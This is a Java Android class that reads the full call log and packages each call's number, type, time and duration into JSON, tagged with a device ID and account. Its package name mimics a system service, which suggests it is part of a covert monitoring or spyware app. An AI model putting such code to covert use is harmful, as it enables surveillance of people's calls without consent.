package system.android.services.imei.calls;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Date;

import system.android.services.imei.MainActivity;

/**
 * Created by root on 11/9/16.
 */
public class ReadCallHistory {

    public static JSONArray getCallDetails(Context context) {
        JSONArray callsArray = new JSONArray();

        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            String callType = cursor.getString(type);
            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = cursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            try {
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("phone", phNumber);
                jsonObject.put("type", dir);
                jsonObject.put("time", callDayTime);
                jsonObject.put("duration", callDuration);
                jsonObject.put("deviceId", MainActivity.deviceId);
                jsonObject.put("account", MainActivity.account);
                callsArray.put(jsonObject);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        cursor.close();

        return callsArray;
    }
}
